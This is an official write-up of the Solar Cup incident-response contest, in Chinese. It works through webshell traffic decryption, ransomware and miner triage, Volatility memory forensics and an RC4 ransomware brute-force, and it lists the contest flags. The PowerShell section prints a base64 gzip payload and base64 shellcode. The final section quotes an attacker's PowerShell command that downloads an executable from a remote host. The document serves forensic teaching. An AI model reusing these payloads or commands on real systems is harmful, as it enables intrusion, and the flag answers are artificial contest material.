---
title: "第一届solar杯·应急响应挑战赛官方题解"
date: 2026-03-21 22:34:35
categories: "应急总结"
tags:
  - "应急总结"
cover: /img/backgrounds/bg-13.png
top_img: /img/backgrounds/bg-13.png
disableNunjucks: true
---

## 【官方WP】第一届solar杯·应急响应挑战赛官方题解
<font style="color:rgb(148, 163, 184);"></font>

<font style="background-color:rgba(70, 70, 70, 0.2);">就在几天前，第一届</font>**<font style="background-color:rgba(70, 70, 70, 0.2);">Solar杯·应急响应挑战赛</font>**<font style="background-color:rgba(70, 70, 70, 0.2);">圆满落下帷幕。这场比赛汇聚了来自全国的网络安全精英，选手们在激烈的技术较量中展现了非凡的能力和智慧。为延续比赛的技术交流与分享精神，我们很高兴向大家呈现本次比赛的官方WP（Writeup）。本篇官方WP将深入解析比赛中的关键赛题，从流量分析到勒索病毒破解，逐步还原真实案例中的技术细节与解决思路。 需要特别说明的是，文中所呈现的这些方法和思路，均基于真实应急响应场景设计，虽然可能并非所有情况下的最优解，但我们希望它们能够为您提供有价值的参考，助力您在未来的应急响应中更加高效地应对复杂多变的安全挑战。让我们一同走进这场技术盛宴，探索网络安全应急响应的更多可能！</font>

# <font style="background-color:rgba(70, 70, 70, 0.2);">1.流量分析</font>
## [<font style="background-color:rgba(70, 70, 70, 0.2);">1.1 文件排查</font>](https://www.solarsecurity.cn/posts/detail?id=37#_11-%E6%96%87%E4%BB%B6%E6%8E%92%E6%9F%A5)
_<font style="background-color:rgba(70, 70, 70, 0.2);">新手运维小王的Geoserver遭到了攻击：</font>_

_<font style="background-color:rgba(70, 70, 70, 0.2);">黑客疑似删除了webshell后门，小王找到了可能是攻击痕迹的文件但不一定是正确的，请帮他排查一下。</font>_

<font style="background-color:rgba(70, 70, 70, 0.2);">从日志分析得知攻击者ip为10.0.100.22对该站点有目录扫描行为与b.jsp交互频繁疑似为上传webshell</font>

<!-- 这是一张图片，ocr 内容为： -->
![](/assets/docs/应急总结/第一届solar杯·应急响应挑战赛官方题解/img-001.png)

<font style="background-color:rgba(70, 70, 70, 0.2);">当访问 JSP 页面时，Tomcat 会根据 JSP 页面动态生成一个 Java 类（</font>`<font style="background-color:rgba(70, 70, 70, 0.2);">.java</font>`<font style="background-color:rgba(70, 70, 70, 0.2);">），然后将其编译为</font><font style="background-color:rgba(70, 70, 70, 0.2);"> </font>`<font style="background-color:rgba(70, 70, 70, 0.2);">.class</font>`<font style="background-color:rgba(70, 70, 70, 0.2);"> </font><font style="background-color:rgba(70, 70, 70, 0.2);">文件。生成的</font><font style="background-color:rgba(70, 70, 70, 0.2);"> </font>`<font style="background-color:rgba(70, 70, 70, 0.2);">.class</font>`<font style="background-color:rgba(70, 70, 70, 0.2);"> </font><font style="background-color:rgba(70, 70, 70, 0.2);">文件是 Tomcat 用来处理请求并返回响应的实际代码。这个过程是动态的，Tomcat 会在后台管理这些文件的编译和更新。路径一般为：</font>`<font style="background-color:rgba(70, 70, 70, 0.2);"><Tomcat_home>/work/Catalina/<host>/<webapp>/org/apache/jsp/</font>`

<font style="background-color:rgba(70, 70, 70, 0.2);">查看b_jsp.java判断为哥斯拉webshell</font>

<!-- 这是一张图片，ocr 内容为： -->
![](/assets/docs/应急总结/第一届solar杯·应急响应挑战赛官方题解/img-002.png)

<font style="background-color:rgba(70, 70, 70, 0.2);">base64解码code</font>

<!-- 这是一张图片，ocr 内容为： -->
![](/assets/docs/应急总结/第一届solar杯·应急响应挑战赛官方题解/img-003.png)

```plain
f!l^a*g{A7b4_X9zK_2v8N_wL5q4}
```

## [<font style="background-color:rgba(70, 70, 70, 0.2);">1.2 流量解密</font>](https://www.solarsecurity.cn/posts/detail?id=37#_12-%E6%B5%81%E9%87%8F%E8%A7%A3%E5%AF%86)
_<font style="background-color:rgba(70, 70, 70, 0.2);">新手运维小王的Geoserver遭到了攻击：</font>_

_<font style="background-color:rgba(70, 70, 70, 0.2);">小王拿到了当时被入侵时的流量，其中一个IP有访问webshell的流量，已提取部分放在了两个pcapng中了。请帮他解密该流量。</font>_

<!-- 这是一张图片，ocr 内容为： -->
![](/assets/docs/应急总结/第一届solar杯·应急响应挑战赛官方题解/img-004.png)

<!-- 这是一张图片，ocr 内容为： -->
![](/assets/docs/应急总结/第一届solar杯·应急响应挑战赛官方题解/img-005.png)

<!-- 这是一张图片，ocr 内容为： -->
![](/assets/docs/应急总结/第一届solar杯·应急响应挑战赛官方题解/img-006.png)

```plain
flag{sA4hP_89dFh_x09tY_lL4SI4}
```

## [<font style="background-color:rgba(70, 70, 70, 0.2);">1.3 文件提取</font>](https://www.solarsecurity.cn/posts/detail?id=37#_13-%E6%96%87%E4%BB%B6%E6%8F%90%E5%8F%96)
_<font style="background-color:rgba(70, 70, 70, 0.2);">新手运维小王的Geoserver遭到了攻击：</font>_

_<font style="background-color:rgba(70, 70, 70, 0.2);">小王拿到了当时被入侵时的流量，黑客疑似通过webshell上传了文件，请看看里面是什么。</font>_

<font style="background-color:rgba(70, 70, 70, 0.2);">使用流量解密工具进行解密流量并删除无用部分后另存为pdf</font>

<!-- 这是一张图片，ocr 内容为： -->
![](/assets/docs/应急总结/第一届solar杯·应急响应挑战赛官方题解/img-007.png)

<!-- 这是一张图片，ocr 内容为： -->
![](/assets/docs/应急总结/第一届solar杯·应急响应挑战赛官方题解/img-008.png)

<!-- 这是一张图片，ocr 内容为： -->
![](/assets/docs/应急总结/第一届solar杯·应急响应挑战赛官方题解/img-009.png)

```plain
flag{dD7g_jk90_jnVm_aPkcs}
```

# <font style="background-color:rgba(70, 70, 70, 0.2);">2.数据库</font>
_<font style="background-color:rgba(70, 70, 70, 0.2);">说明：由于黑客在攻击时可能会修改用户口令、锁定登陆、破坏系统导致无法进入操作系统，因此本题不提供密码</font>_

<font style="background-color:rgba(70, 70, 70, 0.2);">VMware虚拟机进入pe系统： pe镜像下载地址</font>

[<font style="background-color:rgba(70, 70, 70, 0.2);">https://www.hotpe.top/download/</font>](https://www.hotpe.top/download/)

<!-- 这是一张图片，ocr 内容为： -->
![](/assets/docs/应急总结/第一届solar杯·应急响应挑战赛官方题解/img-010.png)

<font style="background-color:rgba(70, 70, 70, 0.2);">在虚拟机编辑设置CD/DVD处选择pe镜像</font>

<!-- 这是一张图片，ocr 内容为： -->
![](/assets/docs/应急总结/第一届solar杯·应急响应挑战赛官方题解/img-011.png)

<font style="background-color:rgba(70, 70, 70, 0.2);">选择电源-->打开电源时进入固件</font>

<!-- 这是一张图片，ocr 内容为： -->
![](/assets/docs/应急总结/第一届solar杯·应急响应挑战赛官方题解/img-012.png)

<font style="background-color:rgba(70, 70, 70, 0.2);">在boot选项中调整启动顺位</font>

<!-- 这是一张图片，ocr 内容为： -->
![](/assets/docs/应急总结/第一届solar杯·应急响应挑战赛官方题解/img-013.png)

<!-- 这是一张图片，ocr 内容为： -->
![](/assets/docs/应急总结/第一届solar杯·应急响应挑战赛官方题解/img-014.png)

<font style="background-color:rgba(70, 70, 70, 0.2);">可以在源系统盘看到勒索信X3rmENR07.README.txt，被加密的文件后缀为.X3rmENR07</font>

<!-- 这是一张图片，ocr 内容为： -->
![](/assets/docs/应急总结/第一届solar杯·应急响应挑战赛官方题解/img-015.png)

<!-- 这是一张图片，ocr 内容为： -->
![](/assets/docs/应急总结/第一届solar杯·应急响应挑战赛官方题解/img-016.png)

<font style="background-color:rgba(70, 70, 70, 0.2);">搜索后缀名得知为lockbit勒索家族</font>

<!-- 这是一张图片，ocr 内容为： -->
![](/assets/docs/应急总结/第一届solar杯·应急响应挑战赛官方题解/img-017.png)

## [<font style="background-color:rgba(70, 70, 70, 0.2);">2.1 攻击者创建隐藏账户的时间</font>](https://www.solarsecurity.cn/posts/detail?id=37#_21-%E6%94%BB%E5%87%BB%E8%80%85%E5%88%9B%E5%BB%BA%E9%9A%90%E8%97%8F%E8%B4%A6%E6%88%B7%E7%9A%84%E6%97%B6%E9%97%B4)
<font style="background-color:rgba(70, 70, 70, 0.2);">查看原系统Security.evtx日志文件</font>

<!-- 这是一张图片，ocr 内容为： -->
![](/assets/docs/应急总结/第一届solar杯·应急响应挑战赛官方题解/img-018.png)

<!-- 这是一张图片，ocr 内容为： -->
![](/assets/docs/应急总结/第一届solar杯·应急响应挑战赛官方题解/img-019.png)

<font style="background-color:rgba(70, 70, 70, 0.2);">flag</font>

```plain
flag{2024/12/16 15:24:21}
```

## [<font style="background-color:rgba(70, 70, 70, 0.2);">2.2 恶意文件的名称</font>](https://www.solarsecurity.cn/posts/detail?id=37#_22-%E6%81%B6%E6%84%8F%E6%96%87%E4%BB%B6%E7%9A%84%E5%90%8D%E7%A7%B0)
<!-- 这是一张图片，ocr 内容为： -->
![](/assets/docs/应急总结/第一届solar杯·应急响应挑战赛官方题解/img-020.png)

```plain
flag{xmrig.exe}
```

## [<font style="background-color:rgba(70, 70, 70, 0.2);">2.3 外联地址</font>](https://www.solarsecurity.cn/posts/detail?id=37#_23-%E5%A4%96%E8%81%94%E5%9C%B0%E5%9D%80)
<font style="background-color:rgba(70, 70, 70, 0.2);">在恶意文件的配置文件中可以看到外联的url为“sierting.com”</font>

<!-- 这是一张图片，ocr 内容为： -->
![](/assets/docs/应急总结/第一届solar杯·应急响应挑战赛官方题解/img-021.png)

<font style="background-color:rgba(70, 70, 70, 0.2);">dns解析为“203.107.45.167”</font>

<!-- 这是一张图片，ocr 内容为： -->
![](/assets/docs/应急总结/第一届solar杯·应急响应挑战赛官方题解/img-022.png)

```plain
flag{203.107.45.167}
```

## [<font style="background-color:rgba(70, 70, 70, 0.2);">2.4 数据库修复</font>](https://www.solarsecurity.cn/posts/detail?id=37#_24-%E6%95%B0%E6%8D%AE%E5%BA%93%E4%BF%AE%E5%A4%8D)
<font style="background-color:rgba(70, 70, 70, 0.2);">使用数据库修复工具“D-Recovery SQL Server”进行修复</font>

<!-- 这是一张图片，ocr 内容为： -->
![](/assets/docs/应急总结/第一届solar杯·应急响应挑战赛官方题解/img-023.png)

<font style="background-color:rgba(70, 70, 70, 0.2);">选择被加密的数据库文件，在”选择参照mdf文件“中选择”【非题目】题mssql-备份数据库（可能会用到）“中的纯表结构文件</font>

<!-- 这是一张图片，ocr 内容为： -->
![](/assets/docs/应急总结/第一届solar杯·应急响应挑战赛官方题解/img-024.png)

<!-- 这是一张图片，ocr 内容为： -->
![](/assets/docs/应急总结/第一届solar杯·应急响应挑战赛官方题解/img-025.png)

```plain
flag{E4r5t5y6mhgur89g}
```

## [<font style="background-color:rgba(70, 70, 70, 0.2);">2.5 逆向恶意powoshell的md5值</font>](https://www.solarsecurity.cn/posts/detail?id=37#_25-%E9%80%86%E5%90%91%E6%81%B6%E6%84%8Fpowoshell%E7%9A%84md5%E5%80%BC)
<font style="background-color:rgba(70, 70, 70, 0.2);">可以在“Windows PowerShell.evtx”日志文件中看到PowerShell执行情况</font>

<!-- 这是一张图片，ocr 内容为： -->
![](/assets/docs/应急总结/第一届solar杯·应急响应挑战赛官方题解/img-026.png)

<font style="background-color:rgba(70, 70, 70, 0.2);">可以看到攻击者在2024/12/16 15:23:01执行的PowerShell其中的</font>

<font style="background-color:rgba(70, 70, 70, 0.2);">New-Object System.IO.MemoryStream：用于 Base64 编码的字符串创建内存流。</font>

<font style="background-color:rgba(70, 70, 70, 0.2);">System.IO.Compression.GzipStream：解压缩 Gzip 编码的数据流。</font>

<font style="background-color:rgba(70, 70, 70, 0.2);">ReadToEnd()：读取并执行解压后的数据内容。</font>

<!-- 这是一张图片，ocr 内容为： -->
![](/assets/docs/应急总结/第一届solar杯·应急响应挑战赛官方题解/img-027.png)

<font style="background-color:rgba(70, 70, 70, 0.2);">解密脚本</font>

```plain
import base64

base64_data = '''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'''
padding = '=' * (4 - len(base64_data) % 4)
base64_data += padding
compressed_data = base64.b64decode(base64_data)
with open("output.gz", "wb") as f:
    f.write(compressed_data)
print("保存成功")
```

<font style="background-color:rgba(70, 70, 70, 0.2);">打开test.txt再次解密</font>

<!-- 这是一张图片，ocr 内容为： -->
![](/assets/docs/应急总结/第一届solar杯·应急响应挑战赛官方题解/img-028.png)

```plain
import base64

base64_data = "/EiD5PDozAAAAEFRQVBSUUgx0lZlSItSYEiLUhhIi1IgTTHJSItyUEgPt0pKSDHArDxhfAIsIEHByQ1BAcHi7VJBUUiLUiCLQjxIAdBmgXgYCwIPhXIAAACLgIgAAABIhcB0Z0gB0ItIGESLQCBJAdBQ41ZI/8lNMclBizSISAHWSDHAQcHJDaxBAcE44HXxTANMJAhFOdF12FhEi0AkSQHQZkGLDEhEi0AcSQHQQYsEiEFYQVheSAHQWVpBWEFZQVpIg+wgQVL/4FhBWVpIixLpS////11JvndzMl8zMgAAQVZJieZIgeygAQAASYnlSbwCAAG9wKiu3EFUSYnkTInxQbpMdyYH/9VMiepoAQEAAFlBuimAawD/1WoKQV5QUE0xyU0xwEj/wEiJwkj/wEiJwUG66g/f4P/VSInHahBBWEyJ4kiJ+UG6maV0Yf/VhcB0Ckn/znXl6JMAAABIg+wQSIniTTHJagRBWEiJ+UG6AtnIX//Vg/gAflVIg8QgXon2akBBWWgAEAAAQVhIifJIMclBulikU+X/1UiJw0mJx00xyUmJ8EiJ2kiJ+UG6AtnIX//Vg/gAfShYQVdZaABAAABBWGoAWkG6Cy8PMP/VV1lBunVuTWH/1Un/zuk8////SAHDSCnGSIX2dbRB/+dYagBZScfC8LWiVv/V"
padding = '=' * (4 - len(base64_data) % 4)
base64_data += padding
decoded_data = base64.b64decode(base64_data)
with open('data.bin', 'wb') as file:
    file.write(decoded_data)
print("保存成功")
```

<!-- 这是一张图片，ocr 内容为： -->
![](/assets/docs/应急总结/第一届solar杯·应急响应挑战赛官方题解/img-029.png)

```plain
flag{d72000ee7388d7d58960db277a91cc40}
```

# <font style="background-color:rgba(70, 70, 70, 0.2);">3.内存取证</font>
<font style="background-color:rgba(70, 70, 70, 0.2);">获取镜像信息</font>

```plain
volatility_2.6_win64_standalone.exe -f SERVER-2008-20241220-162057.raw imageinfo
```

<!-- 这是一张图片，ocr 内容为： -->
![](/assets/docs/应急总结/第一届solar杯·应急响应挑战赛官方题解/img-030.png)

## [<font style="background-color:rgba(70, 70, 70, 0.2);">3.1远程rdp连接的跳板地址：</font>](https://www.solarsecurity.cn/posts/detail?id=37#_31-%E8%BF%9C%E7%A8%8Brdp%E8%BF%9E%E6%8E%A5%E7%9A%84%E8%B7%B3%E6%9D%BF%E5%9C%B0%E5%9D%80)
```plain
volatility_2.6_win64_standalone.exe -f SERVER-2008-20241220-162057.raw --profile=Win7SP1x64 netscan
```

<!-- 这是一张图片，ocr 内容为： -->
![](/assets/docs/应急总结/第一届solar杯·应急响应挑战赛官方题解/img-031.png)

```plain
flag{192.168.60.220}
```

## [<font style="background-color:rgba(70, 70, 70, 0.2);">3.2攻击者下载黑客工具的IP地址：</font>](https://www.solarsecurity.cn/posts/detail?id=37#_32-%E6%94%BB%E5%87%BB%E8%80%85%E4%B8%8B%E8%BD%BD%E9%BB%91%E5%AE%A2%E5%B7%A5%E5%85%B7%E7%9A%84ip%E5%9C%B0%E5%9D%80)
```plain
volatility_2.6_win64_standalone.exe -f SERVER-2008-20241220-162057.raw --profile=Win7SP1x64 cmdscan
```

<!-- 这是一张图片，ocr 内容为： -->
![](/assets/docs/应急总结/第一届solar杯·应急响应挑战赛官方题解/img-032.png)

```plain
flag{155.94.204.67}
```

## [<font style="background-color:rgba(70, 70, 70, 0.2);">3.3黑客获取的“FusionManager节点操作系统帐户（业务帐户）”的密码是什么：</font>](https://www.solarsecurity.cn/posts/detail?id=37#_33-%E9%BB%91%E5%AE%A2%E8%8E%B7%E5%8F%96%E7%9A%84fusionmanager%E8%8A%82%E7%82%B9%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%B8%90%E6%88%B7%E4%B8%9A%E5%8A%A1%E5%B8%90%E6%88%B7%E7%9A%84%E5%AF%86%E7%A0%81%E6%98%AF%E4%BB%80%E4%B9%88)
<font style="background-color:rgba(70, 70, 70, 0.2);">查看攻击者执行的命令，读取了桌面的pass.txt文件</font>

<!-- 这是一张图片，ocr 内容为： -->
![](/assets/docs/应急总结/第一届solar杯·应急响应挑战赛官方题解/img-033.png)

<font style="background-color:rgba(70, 70, 70, 0.2);">查找pass.txt</font>

```plain
volatility_2.6_win64_standalone.exe -f SERVER-2008-20241220-162057.raw --profile=Win7SP1x64 filescan | findstr "pass.txt"
```

<!-- 这是一张图片，ocr 内容为： -->
![](/assets/docs/应急总结/第一届solar杯·应急响应挑战赛官方题解/img-034.png)

<font style="background-color:rgba(70, 70, 70, 0.2);">dump 文件</font>

```plain
volatility_2.6_win64_standalone.exe -f SERVER-2008-20241220-162057.raw --profile=Win7SP1x64 dumpfiles -Q 0x000000007e4cedd0 -D C:\data
```

<!-- 这是一张图片，ocr 内容为： -->
![](/assets/docs/应急总结/第一届solar杯·应急响应挑战赛官方题解/img-035.png)

<font style="background-color:rgba(70, 70, 70, 0.2);">查看文件内容</font>

<!-- 这是一张图片，ocr 内容为： -->
![](/assets/docs/应急总结/第一届solar杯·应急响应挑战赛官方题解/img-036.png)

```plain
flag{GalaxManager_2012}
```

## [<font style="background-color:rgba(70, 70, 70, 0.2);">3.4攻击者创建的用户：</font>](https://www.solarsecurity.cn/posts/detail?id=37#_34-%E6%94%BB%E5%87%BB%E8%80%85%E5%88%9B%E5%BB%BA%E7%9A%84%E7%94%A8%E6%88%B7)
<font style="background-color:rgba(70, 70, 70, 0.2);">Security.evtx记录安全相关的事件，如登录、权限更改、系统策略修改等</font>

<font style="background-color:rgba(70, 70, 70, 0.2);">搜索 Security.evtx 日志文件</font>

```plain
volatility_2.6_win64_standalone.exe -f SERVER-2008-20241220-162057.raw --profile=Win7SP1x64 filescan | findstr "Security.evtx"
```

<!-- 这是一张图片，ocr 内容为： -->
![](/assets/docs/应急总结/第一届solar杯·应急响应挑战赛官方题解/img-037.png)

<font style="background-color:rgba(70, 70, 70, 0.2);">dump 日志文件</font>

```plain
volatility_2.6_win64_standalone.exe -f SERVER-2008-20241220-162057.raw --profile=Win7SP1x64 dumpfiles -Q 0x000000007e744ba0 -D C:\data
```

<font style="background-color:rgba(70, 70, 70, 0.2);">修改后缀为.evtx,查看</font>

<!-- 这是一张图片，ocr 内容为： -->
![](/assets/docs/应急总结/第一届solar杯·应急响应挑战赛官方题解/img-038.png)

```plain
flg{ASP.NET}
```

## [<font style="background-color:rgba(70, 70, 70, 0.2);">3.5 攻击者利用跳板rdp登录的时间</font>](https://www.solarsecurity.cn/posts/detail?id=37#_35-%E6%94%BB%E5%87%BB%E8%80%85%E5%88%A9%E7%94%A8%E8%B7%B3%E6%9D%BFrdp%E7%99%BB%E5%BD%95%E7%9A%84%E6%97%B6%E9%97%B4)
<!-- 这是一张图片，ocr 内容为： -->
![](/assets/docs/应急总结/第一届solar杯·应急响应挑战赛官方题解/img-039.png)

```plain
flag{2024/12/21 00:15:34}
```

## [<font style="background-color:rgba(70, 70, 70, 0.2);">3.6 攻击者创建用户的密码哈希值：</font>](https://www.solarsecurity.cn/posts/detail?id=37#_36-%E6%94%BB%E5%87%BB%E8%80%85%E5%88%9B%E5%BB%BA%E7%94%A8%E6%88%B7%E7%9A%84%E5%AF%86%E7%A0%81%E5%93%88%E5%B8%8C%E5%80%BC)
```plain
volatility_2.6_win64_standalone.exe -f SERVER-2008-20241220-162057.raw --profile=Win7SP1x64 hashdump
```

<!-- 这是一张图片，ocr 内容为： -->
![](/assets/docs/应急总结/第一届solar杯·应急响应挑战赛官方题解/img-040.png)

```plain
flag{5ffe97489cbec1e08d0c6339ec39416d}
```

# <font style="background-color:rgba(70, 70, 70, 0.2);">4.逆向破解</font>
<font style="background-color:rgba(70, 70, 70, 0.2);">在createfileW处下断点，</font>

<!-- 这是一张图片，ocr 内容为： -->
![](/assets/docs/应急总结/第一届solar杯·应急响应挑战赛官方题解/img-041.png)

<font style="background-color:rgba(70, 70, 70, 0.2);">断住之后发现输入的参数为一个文件路径</font>

<font style="background-color:rgba(70, 70, 70, 0.2);">跟踪发现这里使用随机数生成了六位密钥</font>

<!-- 这是一张图片，ocr 内容为： -->
![](/assets/docs/应急总结/第一届solar杯·应急响应挑战赛官方题解/img-042.png)

<font style="background-color:rgba(70, 70, 70, 0.2);">将生成的密钥%10，即生成0-9的密钥</font>

<!-- 这是一张图片，ocr 内容为： -->
![](/assets/docs/应急总结/第一届solar杯·应急响应挑战赛官方题解/img-043.png)

<font style="background-color:rgba(70, 70, 70, 0.2);">明显的rc4特征，rc4密钥初始化</font>

<!-- 这是一张图片，ocr 内容为： -->
![](/assets/docs/应急总结/第一届solar杯·应急响应挑战赛官方题解/img-044.png)

<font style="background-color:rgba(70, 70, 70, 0.2);">交换数组位置，这里就是利用key生成s盒，相当于</font>

```plain
for i in 0..256 {
    j = (j + s[i]  + key[i % key.len()] ) % 256;
    s.swap(i, j);
}
```

<!-- 这是一张图片，ocr 内容为： -->
![](/assets/docs/应急总结/第一届solar杯·应急响应挑战赛官方题解/img-045.png)

<font style="background-color:rgba(70, 70, 70, 0.2);">使用刚刚读取到的内容（v5），利用PRGA生成秘钥流并与密文字节异或，完成rc4加密</font>

<!-- 这是一张图片，ocr 内容为： -->
![](/assets/docs/应急总结/第一届solar杯·应急响应挑战赛官方题解/img-046.png)

<font style="background-color:rgba(70, 70, 70, 0.2);">生成字符串</font>

<!-- 这是一张图片，ocr 内容为： -->
![](/assets/docs/应急总结/第一届solar杯·应急响应挑战赛官方题解/img-047.png)

<font style="background-color:rgba(70, 70, 70, 0.2);">如下</font>

<!-- 这是一张图片，ocr 内容为： -->
![](/assets/docs/应急总结/第一届solar杯·应急响应挑战赛官方题解/img-048.png)

<font style="background-color:rgba(70, 70, 70, 0.2);">再次生成字符串</font>

<!-- 这是一张图片，ocr 内容为： -->
![](/assets/docs/应急总结/第一届solar杯·应急响应挑战赛官方题解/img-049.png)

<font style="background-color:rgba(70, 70, 70, 0.2);">如下</font>

<!-- 这是一张图片，ocr 内容为： -->
![](/assets/docs/应急总结/第一届solar杯·应急响应挑战赛官方题解/img-050.png)

<font style="background-color:rgba(70, 70, 70, 0.2);">将加密后的字符串和自解密生成的字符串拼接，其中自解密生成的字符串无实际用途，每次生成的都一样，仅为加密特征。</font>

<!-- 这是一张图片，ocr 内容为： -->
![](/assets/docs/应急总结/第一届solar杯·应急响应挑战赛官方题解/img-051.png)

<!-- 这是一张图片，ocr 内容为： -->
![](/assets/docs/应急总结/第一届solar杯·应急响应挑战赛官方题解/img-052.png)

<font style="background-color:rgba(70, 70, 70, 0.2);">创建文件</font>

<!-- 这是一张图片，ocr 内容为： -->
![](/assets/docs/应急总结/第一届solar杯·应急响应挑战赛官方题解/img-053.png)

<!-- 这是一张图片，ocr 内容为： -->
![](/assets/docs/应急总结/第一届solar杯·应急响应挑战赛官方题解/img-054.png)

<font style="background-color:rgba(70, 70, 70, 0.2);">写入文件</font>

<!-- 这是一张图片，ocr 内容为： -->
![](/assets/docs/应急总结/第一届solar杯·应急响应挑战赛官方题解/img-055.png)

<font style="background-color:rgba(70, 70, 70, 0.2);">由于密钥是随机生成的，但是因为密钥只有6位而且取值为0-10，因此可以直接爆破出结果</font>

```plain
import itertools
import os
from concurrent.futures.thread import ThreadPoolExecutor


def rc4(key, data):
    key_length = len(key)
    S = list(range(256))
    j = 0

    for i in range(256):
        j = (j + S[i] + key[i % key_length]) % 256
        S[i], S[j] = S[j], S[i]

    i = 0
    j = 0
    result = []
    for byte in data:
        i = (i + 1) % 256
        j = (j + S[i]) % 256
        S[i], S[j] = S[j], S[i]
        K = S[(S[i] + S[j]) % 256]
        result.append(byte ^ K)

    return result

def is_printable(data):
    try:
        return all(32 <= byte <= 126 for byte in data)
    except TypeError:
        return False

ciphertext = []#加密后的数据




def run(key_tuple ):
    key = list(key_tuple)
    decrypted_data = rc4(key, ciphertext)
    # 判断是否解密后的数据是可打印的
    if is_printable(decrypted_data):
        decrypted_string = ''.join(chr(byte) for byte in decrypted_data)
        if 'flag' in decrypted_string:
            print(f"找到有效密钥: {key} -> 解密结果: {decrypted_string}")
max_threads = os.cpu_count()*2
print(max_threads)
with ThreadPoolExecutor(max_workers=max_threads) as executor:
    executor.map(run, itertools.product(range(0, 10), repeat=6))
```

<!-- 这是一张图片，ocr 内容为： -->
![](/assets/docs/应急总结/第一届solar杯·应急响应挑战赛官方题解/img-056.png)

<font style="background-color:rgba(70, 70, 70, 0.2);">其中加密后缀为一个假的flag，但是可以解出结果</font>

<!-- 这是一张图片，ocr 内容为： -->
![](/assets/docs/应急总结/第一届solar杯·应急响应挑战赛官方题解/img-057.png)

# <font style="background-color:rgba(70, 70, 70, 0.2);">5.综合应急</font>
<font style="background-color:rgba(70, 70, 70, 0.2);">24/12/18 9:01:40分以sa账户连接数据库</font>

<!-- 这是一张图片，ocr 内容为： -->
![](/assets/docs/应急总结/第一届solar杯·应急响应挑战赛官方题解/img-058.png)<font style="background-color:rgba(70, 70, 70, 0.2);">24/12/18 9:02:04 由sqlservr.exe通过clr调用cmd.exe而后执行powershell -c iwr -uri</font><font style="background-color:rgba(70, 70, 70, 0.2);"> </font>[<font style="background-color:rgba(70, 70, 70, 0.2);">http://10.0.100.85:81/2.exe</font>](http://10.0.100.85:81/2.exe)<font style="background-color:rgba(70, 70, 70, 0.2);"> </font><font style="background-color:rgba(70, 70, 70, 0.2);">-o C:/windows/tasks/2.exe</font>

<!-- 这是一张图片，ocr 内容为： -->
![](/assets/docs/应急总结/第一届solar杯·应急响应挑战赛官方题解/img-059.png)

<!-- 这是一张图片，ocr 内容为： -->
![](/assets/docs/应急总结/第一届solar杯·应急响应挑战赛官方题解/img-060.png)

<font style="background-color:rgba(70, 70, 70, 0.2);">24/12/18 9:02:08 执行木马</font>

<!-- 这是一张图片，ocr 内容为： -->
![](/assets/docs/应急总结/第一届solar杯·应急响应挑战赛官方题解/img-061.png)

